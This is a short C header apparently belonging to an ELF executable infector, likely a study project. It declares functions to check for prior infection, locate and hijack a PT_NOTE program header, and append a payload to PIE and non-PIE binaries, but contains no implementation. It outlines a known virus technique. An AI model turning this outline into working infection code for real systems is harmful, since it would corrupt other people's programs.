#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <string.h>
#include <elf.h>

typedef struct s_file {
    uint8_t     *ptr;
    char        *path;
    off_t       size;
    int         fd;
    bool        pie;
}   t_file;

#define PAYLOAD_SIZE 100
#define ERROR 1

t_file              *open_file(char *file_name);
bool                is_already_infected(t_file *file);
void                print_ehdr(const Elf64_Ehdr *eHdr);
void                print_all_phdr(t_file *file, const Elf64_Ehdr *eHdr) ;
void                print_phdr(const Elf64_Phdr *pHdr);
Elf64_Phdr          *find_pt_note_phdr(t_file *file, const Elf64_Ehdr *eHdr);
void                hijack_phdr(t_file *file, Elf64_Ehdr *eHdr, Elf64_Phdr *pHdr);
bool                append_payload_no_pie(t_file *file, uint64_t og_entry);
bool                append_payload_pie(t_file *file, uint64_t og_entry);